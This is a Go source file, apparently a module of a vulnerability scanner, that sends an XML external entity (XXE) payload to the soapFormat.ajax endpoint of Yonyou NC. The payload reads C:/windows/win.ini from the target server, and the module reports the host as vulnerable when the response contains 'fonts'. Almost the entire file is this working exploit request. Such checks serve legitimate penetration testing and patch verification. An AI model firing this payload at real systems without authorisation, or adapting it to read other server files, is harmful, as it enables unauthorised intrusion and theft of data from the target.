package uapws_soapFormat_xxe

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"strings"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().EnableDumpEachRequest().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0"
)

func Run(url string) {
	url = url + "/uapws/soapFormat.ajax"
	formPayload := `msg=<!DOCTYPE foo[<!ENTITY xxe1two SYSTEM "file:///C://windows/win.ini"> ]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><soap:Fault><faultcode>soap:Server%26xxe1two%3b</faultcode></soap:Fault></soap:Body></soap:Envelope>%0a`

	resp, err := client.R().SetHeaders(map[string]string{
		"User-Agent":     UA,
		"Content-Type":   "application/x-www-form-urlencoded",
		"Content-Length": "259",
	}).SetBody(formPayload).Post(url)

	if err != nil {
		color.Red.Println("[-] 用友 NC soapFormat XXE漏洞不存在")
		return
	}

	responseBody, err := resp.ToString()
	if err != nil {
		color.Red.Println("[-] Error reading response body")
		return
	}

	if resp.Status == "200 OK" && strings.Contains(responseBody, "fonts") {
		color.Green.Println("[+] 用友 NC soapFormat XXE漏洞存在 -> " + url)
		return
	}
	color.Red.Println("[-] 用友 NC soapFormat XXE漏洞不存在")
}
